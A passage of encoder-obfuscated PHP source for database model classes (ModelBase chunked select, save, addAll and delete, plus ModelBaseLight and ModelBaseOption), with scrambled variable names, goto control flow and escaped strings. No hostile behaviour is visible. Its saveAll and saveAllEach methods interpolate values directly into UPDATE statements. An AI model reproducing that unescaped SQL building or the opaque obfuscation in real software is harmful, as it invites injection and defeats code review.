$aÓ§¥ª×Ì = $this->tableMeta[$c·ñéæ¸Ïì[367]]; goto CšŒø¥ÂÍŞ; CšŒø¥ÂÍŞ: $A†ßŒ§ñ‹Á = Model($this->tableMeta[$c·ñéæ¸Ïì[368]]); if ($Eƒõç×©à‡) { $b˜òËÈ” • = array($aÓ§¥ª×Ì => $Fö×«øçš², $c·ñéæ¸Ïì[92] => $Eƒõç×©à‡); return $A†ßŒ§ñ‹Á->where($b˜òËÈ” •)->getField($c·ñéæ¸Ïì[370]); } $b˜òËÈ” • = array($aÓ§¥ª×Ì => $Fö×«øçš²); goto fÒÊÒ†·Æ×; fÒÊÒ†·Æ×: $Cá—¾¨‚šŒ = $A†ßŒ§ñ‹Á->field($c·ñéæ¸Ïì[372])->where($b˜òËÈ” •)->select(); $Cá—¾¨‚šŒ = array_to_keyvalue($Cá—¾¨‚šŒ, $c·ñéæ¸Ïì[92], $c·ñéæ¸Ïì[370]); return $Cá—¾¨‚šŒ; goto Fšô ÷ßº‚; Fšô ÷ßº‚: } private function checkDataAutoHas($aò´ÃÃˆš) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $fÈè¦…¤µ) { if (in_array($aò´ÃÃˆš, explode($_SERVER[ÉóçÄÇ][47], $fÈè¦…¤µ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$CŒáÇÂÓ¿Ò, $A¨œË•æâõ) { $e£Üñã ã¯ =& $_SERVER[ÉóçÄÇ]; foreach ($this->dataAuto as $F“¢®‰·¥) { $F¦‚ô¼âÁ¦ = $F“¢®‰·¥[0]; if (!in_array($A¨œË•æâõ, explode($e£Üñã ã¯[47], $F“¢®‰·¥[2]))) { continue; } switch (trim($F“¢®‰·¥[3])) { case $e£Üñã ã¯[317]: case $e£Üñã ã¯[318]: $B‰–ĞŸ‘’‰ = $F“¢®‰·¥[1]; $dƒ‡°—¡ß = isset($F“¢®‰·¥[4]) ? (array) $F“¢®‰·¥[4] : array(); if ($B‰–ĞŸ‘’‰ == $e£Üñã ã¯[195] && array_key_exists($F¦‚ô¼âÁ¦, $CŒáÇÂÓ¿Ò)) { if (!$CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦]) { unset($CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦]); } break; } if (isset($CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦])) { array_unshift($dƒ‡°—¡ß, $CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦]); } if ($e£Üñã ã¯[317] == $F“¢®‰·¥[3]) { $CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦] = call_user_func_array($B‰–ĞŸ‘’‰, $dƒ‡°—¡ß); } else { $CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦] = call_user_func_array(array(&$this, $B‰–ĞŸ‘’‰), $dƒ‡°—¡ß); } break; case $e£Üñã ã¯[269]: $CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦] = $CŒáÇÂÓ¿Ò[$F“¢®‰·¥[1]]; break; case $e£Üñã ã¯[290]: if (isset($CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦]) && !is_string($CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦])) { $CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦] = json_encode_force($CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦]); } break; case $e£Üñã ã¯[319]: if ($CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦] === $e£Üñã ã¯[33]) { unset($CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦]); } break; case $e£Üñã ã¯[320]: $CŒáÇÂÓ¿Ò[$F¦‚ô¼âÁ¦] = $F“¢®‰·¥[1]; default: break; } } if ($A¨œË•æâõ == $e£Üñã ã¯[353]) { $fËš—ó•Õğ = strtolower($this->db->getDbType()); if (strpos($fËš—ó•Õğ, $e£Üñã ã¯[9]) !== 0) { return; } $CÇ†”±‚É = $this->field(!0)->fields; $b‚ÍÁÙÎ = $CÇ†”±‚É[$e£Üñã ã¯[248]]; if (isset($CÇ†”±‚É[$e£Üñã ã¯[247]])) { unset($b‚ÍÁÙÎ[$CÇ†”±‚É[$e£Üñã ã¯[247]]]); } foreach ($b‚ÍÁÙÎ as $dÆÅ¸°Š¤É => $A¨œË•æâõ) { if (!isset($CŒáÇÂÓ¿Ò[$dÆÅ¸°Š¤É])) { $CŒáÇÂÓ¿Ò[$dÆÅ¸°Š¤É] = $e£Üñã ã¯[33]; } } } } private function dataAfterFilter(&$a”ÑÅÊçŸµ) { $DÒÍÂĞ¦òŞ =& $_SERVER[ÉóçÄÇ]; foreach ($this->dataAuto as $c‘Ğ‡Á¾Ï) { $cñ‹¾³ì„™ = $c‘Ğ‡Á¾Ï[0]; if (!in_array($DÒÍÂĞ¦òŞ[355], explode($DÒÍÂĞ¦òŞ[47], $c‘Ğ‡Á¾Ï[2]))) { continue; } if (!isset($a”ÑÅÊçŸµ[$cñ‹¾³ì„™])) { continue; } switch (trim($c‘Ğ‡Á¾Ï[3])) { case $DÒÍÂĞ¦òŞ[317]: case $DÒÍÂĞ¦òŞ[318]: $AÎì¢ÜÆòÎ = isset($c‘Ğ‡Á¾Ï[4]) ? (array) $c‘Ğ‡Á¾Ï[4] : array(); array_unshift($AÎì¢ÜÆòÎ, $a”ÑÅÊçŸµ[$cñ‹¾³ì„™]); if ($DÒÍÂĞ¦òŞ[317] == $c‘Ğ‡Á¾Ï[3]) { $a”ÑÅÊçŸµ[$cñ‹¾³ì„™] = call_user_func_array($c‘Ğ‡Á¾Ï[1], $AÎì¢ÜÆòÎ); } else { $a”ÑÅÊçŸµ[$cñ‹¾³ì„™] = call_user_func_array(array(&$this, $c‘Ğ‡Á¾Ï[1]), $AÎì¢ÜÆòÎ); } break; case $DÒÍÂĞ¦òŞ[269]: $a”ÑÅÊçŸµ[$cñ‹¾³ì„™] = $a”ÑÅÊçŸµ[$c‘Ğ‡Á¾Ï[1]]; break; case $DÒÍÂĞ¦òŞ[290]: $cĞËÖ¾¹Ç‰ = $a”ÑÅÊçŸµ[$cñ‹¾³ì„™]; $a”ÑÅÊçŸµ[$cñ‹¾³ì„™] = json_decode($cĞËÖ¾¹Ç‰, !0); if (is_null($a”ÑÅÊçŸµ[$cñ‹¾³ì„™])) { $a”ÑÅÊçŸµ[$cñ‹¾³ì„™] = $cĞËÖ¾¹Ç‰; } break; case $DÒÍÂĞ¦òŞ[319]: if ($a”ÑÅÊçŸµ[$cñ‹¾³ì„™] === $DÒÍÂĞ¦òŞ[33]) { unset($a”ÑÅÊçŸµ[$cñ‹¾³ì„™]); } break; case $DÒÍÂĞ¦òŞ[320]: $a”ÑÅÊçŸµ[$cñ‹¾³ì„™] = $c‘Ğ‡Á¾Ï[1]; default: break; } } } public function saveAll($dÖº—¡ôŞ„) { goto d»Ïß¶Ú¥’; d»Ïß¶Ú¥’: $c’˜œ˜èÛ =& $_SERVER[ÉóçÄÇ]; $AæŒ‡á í† = $this->tablePrefix . $this->tableName; $a“…ñô¡à = self::SQL_WHERE_IN_CHUNK; goto fŞØ÷ïŒ­‚; E´‡¡öìç: $B…òó“Ã†Ë = array(); $C‚ôâ†¹œ× = count($dÖº—¡ôŞ„); for ($B½æ¾Á‹ƒ = 0; $B½æ¾Á‹ƒ < $C‚ôâ†¹œ×; $B½æ¾Á‹ƒ++) { $aÊ»ÂÁÊÕ› = $dÖº—¡ôŞ„[$B½æ¾Á‹ƒ]; if (!is_array($aÊ»ÂÁÊÕ›) || count($aÊ»ÂÁÊÕ›) != 4) { continue; } $Côºò´Ô¼ = "\125\120\104\101\124\x45\40\x60{$AæŒ‡á í†}\x60\x20\x53\105\124\x20{$aÊ»ÂÁÊÕ›[2]}\40\75\x20\103\101\123\x45\40{$aÊ»ÂÁÊÕ›[0]}\x20\12"; if ($c‹Ä¬œË•š == 0) { $dÜµÖÃ•ô = $Côºò´Ô¼; } $B…òó“Ã†Ë[] = $c’˜œ˜èÛ[115] . $aÊ»ÂÁÊÕ›[1] . $c’˜œ˜èÛ[115]; $c‹Ä¬œË•š++; $dÜµÖÃ•ô .= "\40\x57\110\x45\x4e\40\x27{$aÊ»ÂÁÊÕ›[1]}\47\40\x54\x48\x45\x4e\x20\47{$aÊ»ÂÁÊÕ›[3]}\x27\x20\12"; if ($c‹Ä¬œË•š == $a“…ñô¡à || $B½æ¾Á‹ƒ == $C‚ôâ†¹œ× - 1) { goto FœÄŠÓ‡‰È; F‰İ‹£ì: $B…òó“Ã†Ë = array(); goto fÚêªœòºå; BÀ•œéíÑƒ: $c‹Ä¬œË•š = 0; $dÜµÖÃ•ô = $Côºò´Ô¼; $this->chunkEventCheck(count($B…òó“Ã†Ë)); goto F‰İ‹£ì; FœÄŠÓ‡‰È: $CŠ¾Â—»™± = implode($c’˜œ˜èÛ[47], $B…òó“Ã†Ë); $dÜµÖÃ•ô .= "\40\105\116\104\x20\x20\127\110\x45\x52\105\40{$aÊ»ÂÁÊÕ›[0]}\40\x49\116\x20\x28{$CŠ¾Â—»™±}\51\40"; $this->execute($dÜµÖÃ•ô); goto BÀ•œéíÑƒ; fÚêªœòºå: } } goto f»¯šé«¸; fŞØ÷ïŒ­‚: $dÖº—¡ôŞ„ = is_array($dÖº—¡ôŞ„) ? $dÖº—¡ôŞ„ : array(); $dÜµÖÃ•ô = $c’˜œ˜èÛ[373]; $c‹Ä¬œË•š = 0; goto E´‡¡öìç; f»¯šé«¸: $this->chunkEventSet(); goto CÈò¶Êäªí; CÈò¶Êäªí: } public function saveAllEach($bõ÷òˆ¶í) { $dÔ›­Ä»©¬ =& $_SERVER[ÉóçÄÇ]; $d³µâœ¸³ = $this->tablePrefix . $this->tableName; foreach ($bõ÷òˆ¶í as $fİˆí¿ÌÒ°) { if (!is_array($fİˆí¿ÌÒ°) || count($fİˆí¿ÌÒ°) != 4) { continue; } $aÜùÚì¢Â = $fİˆí¿ÌÒ°[0] . $dÔ›­Ä»©¬[374] . $fİˆí¿ÌÒ°[1] . $dÔ›­Ä»©¬[115]; $Eò†÷ñÍ¸‚ = $fİˆí¿ÌÒ°[2] . $dÔ›­Ä»©¬[374] . $fİˆí¿ÌÒ°[3] . $dÔ›­Ä»©¬[115]; $E„Ï÷²›ù = "\x75\x70\x64\x61\164\145\40{$d³µâœ¸³}\x20\163\145\x74\x20{$Eò†÷ñÍ¸‚}\40\x77\x68\145\162\145\x20{$aÜùÚì¢Â}\73"; $this->execute($E„Ï÷²›ù); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($C¢¸¶ ·ÛÍ = false, $A¨¾ğ†¬Ë = false) { $this->_chunkEvent = $C¢¸¶ ·ÛÍ; $this->_chunkEventParam = $A¨¾ğ†¬Ë; } private function chunkEventCheck($eÒ©Úßì¤é) { if (!$this->_chunkEvent) { return; } $D‹ïÌ±È²  = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $D‹ïÌ±È² [$_SERVER[ÉóçÄÇ][375]] = $eÒ©Úßì¤é; Hook::trigger($this->_chunkEvent, $D‹ïÌ±È² ); } public function addAll($b‘É÷Èî”º, $c³Ù‹Ù³Ì‘ = array(), $BÖøÀ×‰ = false) { goto cÚ–µÁ’®; eÛŞÑ÷Ê‚: if (method_exists($this->db, $f’ñÑ¾å¡[268])) { for ($C‰õí˜¶²ˆ = 0; $C‰õí˜¶²ˆ < count($b‘É÷Èî”º); $C‰õí˜¶²ˆ += $D¥ÛÅ­àˆÖ) { $e»ª¹Ø½§‘ = array_slice($b‘É÷Èî”º, $C‰õí˜¶²ˆ, $D¥ÛÅ­àˆÖ); if (!is_array($e»ª¹Ø½§‘) || count($e»ª¹Ø½§‘) == 0) { break; } $b¨Ë¢ñŠĞà = $this->db->insertAll($e»ª¹Ø½§‘, $c³Ù‹Ù³Ì‘, $BÖøÀ×‰); $this->chunkEventCheck(count($e»ª¹Ø½§‘)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($b‘É÷Èî”º as $B¢ê˜Á’Ø => $cš‰®†Á‹Ò) { $b¨Ë¢ñŠĞà = $this->db->insert($cš‰®†Á‹Ò, $c³Ù‹Ù³Ì‘, $BÖøÀ×‰); } $this->commit(); } if (!1 !== $b¨Ë¢ñŠĞà) { $eÍäÉŠÑÍÔ = $this->getLastInsID(); if ($eÍäÉŠÑÍÔ) { return $eÍäÉŠÑÍÔ; } } return $b¨Ë¢ñŠĞà; goto dëöµ§Ì‹¢; cÚ–µÁ’®: $f’ñÑ¾å¡ =& $_SERVER[ÉóçÄÇ]; ignore_timeout(); $D¥ÛÅ­àˆÖ = self::SQL_WHERE_IN_CHUNK; goto Cİâ“ê«ˆ¨; Cİâ“ê«ˆ¨: if (empty($b‘É÷Èî”º)) { $this->error = think_lang($f’ñÑ¾å¡[267]); return !1; } $c³Ù‹Ù³Ì‘ = $this->_parseOptions($c³Ù‹Ù³Ì‘); foreach ($b‘É÷Èî”º as $B¢ê˜Á’Ø => $cš‰®†Á‹Ò) { $b‘É÷Èî”º[$B¢ê˜Á’Ø] = $this->_facade($cš‰®†Á‹Ò); $this->_beforeInsert($b‘É÷Èî”º[$B¢ê˜Á’Ø], $c³Ù‹Ù³Ì‘); } goto eÛŞÑ÷Ê‚; dëöµ§Ì‹¢: } public function save($Fš™³ÎãŒ = '', $cÚÎ°šó÷ = array()) { goto AÖ¾¶İâ½Ÿ; F“‡à¹¯²Š: $C¡„Š³æÚƒ = $this->findWhereField($EÙÕ±ºå); if (!$C¡„Š³æÚƒ) { return parent::save($Fš™³ÎãŒ, $cÚÎ°šó÷); } $C–¤©ø’ ¯ = 0; goto e”á¹éÄ; AÖ¾¶İâ½Ÿ: $CøĞÅÙ›ìÊ =& $_SERVER[ÉóçÄÇ]; $C…œ‹¨Ë¤… = self::SQL_WHERE_IN_CHUNK; $EÙÕ±ºå = $this->optionsValue(); goto F“‡à¹¯²Š; e”á¹éÄ: $B‚ó´Áñš– = $EÙÕ±ºå[$CøĞÅÙ›ìÊ[271]][$C¡„Š³æÚƒ][1]; $B‚ó´Áñš– = is_array($B‚ó´Áñš–) ? $B‚ó´Áñš– : array(); $Fß‹’Æ = count($B‚ó´Áñš–); goto FàãÄ”•´¹; FàãÄ”•´¹: for ($B‚÷Œİ©†é = 0; $B‚÷Œİ©†é < $Fß‹’Æ; $B‚÷Œİ©†é += $C…œ‹¨Ë¤…) { $Aëô‡ø = array_slice($B‚ó´Áñš–, $B‚÷Œİ©†é, $C…œ‹¨Ë¤…); if (!is_array($Aëô‡ø) || count($Aëô‡ø) == 0) { break; } $EÙÕ±ºå[$CøĞÅÙ›ìÊ[271]][$C¡„Š³æÚƒ][1] = $Aëô‡ø; $this->optionsValue($EÙÕ±ºå); $C–¤©ø’ ¯ += parent::save($Fš™³ÎãŒ, $cÚÎ°šó÷); $this->chunkEventCheck(count($Aëô‡ø)); } $this->chunkEventSet(); return $C–¤©ø’ ¯; goto C”ß…Âƒá; C”ß…Âƒá: } public function add($DÏ®îÛ¸÷¡ = '', $B½İ·ÖÉ = array(), $dŸØõ‹õ  = false) { if ($this->addTaskStatus && is_array($DÏ®îÛ¸÷¡)) { $this->addTaskData[] = $DÏ®îÛ¸÷¡; return; } return parent::add($DÏ®îÛ¸÷¡, $B½İ·ÖÉ, $dŸØõ‹õ ); } public function parseWhereLike($D£‡Çùğãó, $d±”ãÏÇÕ¨ = '', $BÉâ³Õ‚Ò = false, &$Dñ“ƒøÒ²» = false) { goto AÊÚÏñ„Ä°; BòÜé”©£ˆ: foreach ($D£‡Çùğãó as $d¢¯ø¼Ì» => $eäÒçÊœ†¦) { if (is_array($eäÒçÊœ†¦) && count($eäÒçÊœ†¦) == 2 && $eäÒçÊœ†¦[0] == $fßáÚî ¢[378] && is_string($eäÒçÊœ†¦[1]) && substr($eäÒçÊœ†¦[1], 0, 1) == $fßáÚî ¢[379] && substr($eäÒçÊœ†¦[1], strlen($eäÒçÊœ†¦[1]) - 1, 1) == $fßáÚî ¢[379]) { goto DÑßé‚Ñ×ø; F°‘±œ§›”: $aÆî£ëóÓÜ[$BÇ’Íì‘ĞÀ] = $fßáÚî ¢[382] . $dÖ“‹õ«Õâ . $fßáÚî ¢[383] . $bÕ›ù²Ÿ­ì . $fßáÚî ¢[384]; $BÇ’Íì‘ĞÀ++; continue; goto FŒ¹”Ö‰õ; B°ê÷˜©’Â: $bÕ›ù²Ÿ­ì = $this->db->escapeString($bÕ›ù²Ÿ­ì); if (!strpos($dÖ“‹õ«Õâ, $fßáÚî ¢[94])) { $dÖ“‹õ«Õâ = $fßáÚî ¢[380] . $dÖ“‹õ«Õâ . $fßáÚî ¢[380]; } if ($aÀ¡ˆÌ«Õ˜[$fßáÚî ¢[381]]) { $bÕ›ù²Ÿ­ì = $fßáÚî ¢[115] . $bÕ›ù²Ÿ­ì . $fßáÚî ¢[115]; } goto F°‘±œ§›”; DÑßé‚Ñ×ø: $Dñ“ƒøÒ²» = !0; $dÖ“‹õ«Õâ = is_string($d¢¯ø¼Ì») ? $d¢¯ø¼Ì» : $d±”ãÏÇÕ¨; $bÕ›ù²Ÿ­ì = substr($eäÒçÊœ†¦[1], 1, strlen($eäÒçÊœ†¦[1]) - 2); goto B°ê÷˜©’Â; FŒ¹”Ö‰õ: } if (is_array($eäÒçÊœ†¦)) { $d±”ãÏÇÕ¨ = is_string($d¢¯ø¼Ì») ? $d¢¯ø¼Ì» : $d±”ãÏÇÕ¨; $eäÒçÊœ†¦ = $this->parseWhereLike($eäÒçÊœ†¦, $d±”ãÏÇÕ¨, !0, $Dñ“ƒøÒ²»); } if (is_numeric($d¢¯ø¼Ì»)) { $aÆî£ëóÓÜ[$BÇ’Íì‘ĞÀ] = $eäÒçÊœ†¦; $BÇ’Íì‘ĞÀ++; } else { $aÆî£ëóÓÜ[$d¢¯ø¼Ì»] = $eäÒçÊœ†¦; } } if ($Dñ“ƒøÒ²» && !$BÉâ³Õ‚Ò) { trace_log(array($aÆî£ëóÓÜ, $D£‡Çùğãó), $fßáÚî ¢[271]); } return $aÆî£ëóÓÜ; goto eâÑÔ¡‘µ•; dÛ¯­Ô¥Æ: if (!is_array($D£‡Çùğãó)) { return $D£‡Çùğãó; } $aÆî£ëóÓÜ = array(); $BÇ’Íì‘ĞÀ = 0; goto BòÜé”©£ˆ; AÊÚÏñ„Ä°: $fßáÚî ¢ =& $_SERVER[ÉóçÄÇ]; $aÀ¡ˆÌ«Õ˜ = $GLOBALS[$fßáÚî ¢[6]][$fßáÚî ¢[376]]; if (!$aÀ¡ˆÌ«Õ˜[$fßáÚî ¢[377]]) { return $D£‡Çùğãó; } goto dÛ¯­Ô¥Æ; eâÑÔ¡‘µ•: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($aØ¯•‚‰Ü‚ = array()) { goto Cá¨Åá¡; cÏ±‰‹¬´â: return $A©„Ñêæõğ; goto BŠ¤Ì¬äÁ; F÷„ èÍ‹‰: $AÂÀÄëƒ‡‚ = $this->findWhereField($dŠ¦çØ‰Èæ); if (!$AÂÀÄëƒ‡‚ || isset($dŠ¦çØ‰Èæ[$fØë†ÁºŞ©[288]]) || isset($dŠ¦çØ‰Èæ[$fØë†ÁºŞ©[349]])) { return parent::select($aØ¯•‚‰Ü‚); } $eÜ¿Ô»“Ÿ = $dŠ¦çØ‰Èæ[$fØë†ÁºŞ©[271]][$AÂÀÄëƒ‡‚][1]; goto E‡Í¤ŒŒ¿·; E‡Í¤ŒŒ¿·: $eÜ¿Ô»“Ÿ = is_array($eÜ¿Ô»“Ÿ) ? $eÜ¿Ô»“Ÿ : array(); $A©„Ñêæõğ = null; for ($E¹éÒñçŒË = 0; $E¹éÒñçŒË < count($eÜ¿Ô»“Ÿ); $E¹éÒñçŒË += $A®”Öç÷ÖÚ) { $E«¤¯íÓè‡ = array_slice($eÜ¿Ô»“Ÿ, $E¹éÒñçŒË, $A®”Öç÷ÖÚ); if (!is_array($E«¤¯íÓè‡) || count($E«¤¯íÓè‡) == 0) { break; } $dŠ¦çØ‰Èæ[$fØë†ÁºŞ©[271]][$AÂÀÄëƒ‡‚][1] = $E«¤¯íÓè‡; $this->optionsValue($dŠ¦çØ‰Èæ); $f„¶¥çôÚµ = parent::select($aØ¯•‚‰Ü‚); if (!$f„¶¥çôÚµ) { continue; } if (is_null($A©„Ñêæõğ)) { $A©„Ñêæõğ = array(); } $A©„Ñêæõğ = array_merge($A©„Ñêæõğ, $f„¶¥çôÚµ); } goto cÏ±‰‹¬´â; Cá¨Åá¡: $fØë†ÁºŞ© =& $_SERVER[ÉóçÄÇ]; $A®”Öç÷ÖÚ = self::SQL_WHERE_IN_CHUNK; $dŠ¦çØ‰Èæ = $this->optionsValue(); goto F÷„ èÍ‹‰; BŠ¤Ì¬äÁ: } public function delete($DµÎÃ¢÷î = array()) { goto BÒ‚¨´ÌÑ¤; BÈ¤‹÷îÎ: $E¿Ú¡ò§¼Ô = $this->findWhereField($d¯¯³íàŸô); if (!$E¿Ú¡ò§¼Ô) { return parent::delete($DµÎÃ¢÷î); } $EÌ„ÉëíÈ› = 0; goto D¾ï¾Ò¢ÑÎ; DÎÇ‹‘”Êî: return $EÌ„ÉëíÈ›; goto eœ²Ã×Äƒ; BÒ‚¨´ÌÑ¤: $C„Ç‰¸ìˆÄ =& $_SERVER[ÉóçÄÇ]; $dõŞÄ³îÏ = self::SQL_WHERE_IN_CHUNK; $d¯¯³íàŸô = $this->optionsValue(); goto BÈ¤‹÷îÎ; D¾ï¾Ò¢ÑÎ: $B‘Š·¶½‹Î = $d¯¯³íàŸô[$C„Ç‰¸ìˆÄ[271]][$E¿Ú¡ò§¼Ô][1]; $B‘Š·¶½‹Î = is_array($B‘Š·¶½‹Î) ? $B‘Š·¶½‹Î : array(); for ($Dø¶›£¬ÆÆ = 0; $Dø¶›£¬ÆÆ < count($B‘Š·¶½‹Î); $Dø¶›£¬ÆÆ += $dõŞÄ³îÏ) { $aæõ¥Û¥¯ = array_slice($B‘Š·¶½‹Î, $Dø¶›£¬ÆÆ, $dõŞÄ³îÏ); if (!is_array($aæõ¥Û¥¯) || count($aæõ¥Û¥¯) == 0) { break; } $d¯¯³íàŸô[$C„Ç‰¸ìˆÄ[271]][$E¿Ú¡ò§¼Ô][1] = $aæõ¥Û¥¯; $this->optionsValue($d¯¯³íàŸô); $EÌ„ÉëíÈ› += parent::delete($DµÎÃ¢÷î); } goto DÎÇ‹‘”Êî; eœ²Ã×Äƒ: } private function findWhereField($aˆ¶š…ù¥Æ) { $E«ˆÛ¨ÀÈ =& $_SERVER[ÉóçÄÇ]; $f»Ë¤Î¼Ü’ = self::SQL_WHERE_IN_CHUNK; if (!is_array($aˆ¶š…ù¥Æ) || !is_array($aˆ¶š…ù¥Æ[$E«ˆÛ¨ÀÈ[271]])) { return !1; } foreach ($aˆ¶š…ù¥Æ[$E«ˆÛ¨ÀÈ[271]] as $E•º¡ËÅ¡ => $Dš²¬çùÑ) { if (is_array($Dš²¬çùÑ) && isset($Dš²¬çùÑ[0]) && is_string($Dš²¬çùÑ[0]) && strtolower($Dš²¬çùÑ[0]) == $E«ˆÛ¨ÀÈ[7] && is_array($Dš²¬çùÑ[1]) && count($Dš²¬çùÑ[1]) > $f»Ë¤Î¼Ü’) { ignore_timeout(); return $E•º¡ËÅ¡; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array(); public function listData($FÜÂÃ·ÄƒŠ = false, $eÃÄĞÕâŠÏ = "\x6d\x6f\144\x69\146\171\124\151\155\x65", $a»‰Å¸®‹Ã = false) { $AìËÒĞÍè£ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$AìËÒĞÍè£) { return $FÜÂÃ·ÄƒŠ ? null : array(); } if (!$FÜÂÃ·ÄƒŠ) { $AìËÒĞÍè£ = array_filter(array_values($AìËÒĞÍè£)); return array_sort_by($AìËÒĞÍè£, $eÃÄĞÕâŠÏ, $a»‰Å¸®‹Ã); } return $AìËÒĞÍè£[$_SERVER[ÉóçÄÇ][385] . $FÜÂÃ·ÄƒŠ]; } public function insert($c‡‰ˆ£õí¢) { goto FµÂ·šº; FµÂ·šº: $bèèŒ“Ï­Ğ =& $_SERVER[ÉóçÄÇ]; $c‡‰ˆ£õí¢ = array_field_key($c‡‰ˆ£õí¢, $this->field); $eÖ¿‰…Ÿ¯” = Model($this->modelType)->get($bèèŒ“Ï­Ğ[386], $this->optionType . $bèèŒ“Ï­Ğ[387]); goto aî¡Ì½ï»; C·Å…¥åèŞ: $c‡‰ˆ£õí¢[$bèèŒ“Ï­Ğ[83]] = time(); Model($this->modelType)->set($bèèŒ“Ï­Ğ[386], $eÖ¿‰…Ÿ¯”, $this->optionType . $bèèŒ“Ï­Ğ[387]); Model($this->modelType)->set($bèèŒ“Ï­Ğ[385] . $eÖ¿‰…Ÿ¯”, $c‡‰ˆ£õí¢, $this->optionType); goto a…ÒŠãˆ‰; a…ÒŠãˆ‰: return $eÖ¿‰…Ÿ¯”; goto CêÕ™ÓŒÚ¥; aî¡Ì½ï»: $eÖ¿‰…Ÿ¯” = $eÖ¿‰…Ÿ¯” ? $eÖ¿‰…Ÿ¯” : 0; $c‡‰ˆ£õí¢[$bèèŒ“Ï­Ğ[388]] = ++$eÖ¿‰…Ÿ¯”; $c‡‰ˆ£õí¢[$bèèŒ“Ï­Ğ[192]] = time(); goto C·Å…¥åèŞ; CêÕ™ÓŒÚ¥: } public function update($C÷Œº—»‹«, $DÄ‰ÏŠÏè•) { goto dÌ–‰–õí½; f‚ÊÕŞêóœ: if (!$fæ«Š°»Õ) { return !1; } $DÄ‰ÏŠÏè• = array_merge($fæ«Š°»Õ, $DÄ‰ÏŠÏè•); $DÄ‰ÏŠÏè•[$eÂ¥µÙÒİõ[83]] = time(); goto bê¯­ŒƒÙê; bê¯­ŒƒÙê: return Model($this->modelType)->set($eÂ¥µÙÒİõ[385] . $C÷Œº—»‹«, $DÄ‰ÏŠÏè•, $this->optionType); goto cì²½œÂ’; dÌ–‰–õí½: $eÂ¥µÙÒİõ =& $_SERVER[ÉóçÄÇ]; $DÄ‰ÏŠÏè• = array_field_key($DÄ‰ÏŠÏè•, $this->field); $fæ«Š°»Õ = $this->listData($C÷Œº—»‹«); goto f‚ÊÕŞêóœ; cì²½œÂ’: } public function remove($dºò„—Ã›×) { return Model($this->modelType)->remove($_SERVER[ÉóçÄÇ][385] . $dºò„—Ã›×, $this->optionType); } public function clear() { $Fîé¿·ñï‰ =& $_SERVER[ÉóçÄÇ]; Model($this->modelType)->remove($Fîé¿·ñï‰[386], $this->optionType . $Fîé¿·ñï‰[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Aï»¢Úµçø, $b–³‡³’) { if (!$b–³‡³’) { return !1; } $bÔ‰´ñŒÂĞ = $this->listData(); $bÔ‰´ñŒÂĞ = array_to_keyvalue($bÔ‰´ñŒÂĞ, $Aï»¢Úµçø); return isset($bÔ‰´ñŒÂĞ[$b–³‡³’]) ? $bÔ‰´ñŒÂĞ[$b–³‡³’] : !1; } public function findByName($c—»ôçÓí¶) { return $this->findByKey($_SERVER[ÉóçÄÇ][28], $c—»ôçÓí¶); } protected function resetData($AÍ¹Û™Ÿ ‰) { $dïÊ×Ù‰’Ñ =& $_SERVER[ÉóçÄÇ]; $AÍ¹Û™Ÿ ‰ = is_array($AÍ¹Û™Ÿ ‰) ? $AÍ¹Û™Ÿ ‰ : array(); $D‡Ì½Ñ ô• = array(); for ($f¡‰—–¢œ÷ = 0; $f¡‰—–¢œ÷ < count($AÍ¹Û™Ÿ ‰); $f¡‰—–¢œ÷++) { $D‡Ì½Ñ ô•[$dïÊ×Ù‰’Ñ[385] . $AÍ¹Û™Ÿ ‰[$f¡‰—–¢œ÷][$dïÊ×Ù‰’Ñ[388]]] = $AÍ¹Û™Ÿ ‰[$f¡‰—–¢œ÷]; } return Model($this->modelType)->set($D‡Ì½Ñ ô•, !1, $this->optionType); } private function getAutoName($EÁ‚‚ç¬¨¡) { $bˆ¢Ú°ÊĞ = array_to_keyvalue($this->listData(), $_SERVER[ÉóçÄÇ][28]); if (!$bˆ¢Ú°ÊĞ || !isset($bˆ¢Ú°ÊĞ[$EÁ‚‚ç¬¨¡])) { return $EÁ‚‚ç¬¨¡; } for ($a ¶†¨ Õƒ = 1; $a ¶†¨ Õƒ < count($bˆ¢Ú°ÊĞ); $a ¶†¨ Õƒ++) { $C’Ò³Öƒõ  = $EÁ‚‚ç¬¨¡ . "\50{$a ¶†¨ Õƒ}\51"; if (!isset($bˆ¢Ú°ÊĞ[$C’Ò³Öƒõ ])) { return $C’Ò³Öƒõ ; } } return $C’Ò³Öƒõ ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($FÚ­îÕ°¸Š = false, $fæŠ…ë˜ˆ® = '', $aÇÏ×ôÛÉÒ = false) { goto cÊšØç›Û; cÊšØç›Û: $c‘ùÁÍ´Ü =& $_SERVER[ÉóçÄÇ]; $DÚÏó›Í´ = $this->cacheGet($fæŠ…ë˜ˆ®); $EàŞ¹ÖÏ½à = $this->optionDefault($fæŠ…ë˜ˆ®); goto C¹¸Ü«Šóó; D¿×™ğèÍ÷: $DÚÏó›Í´ = $this->where($c×åÅá”Å)->select(); $DÚÏó›Í´ = 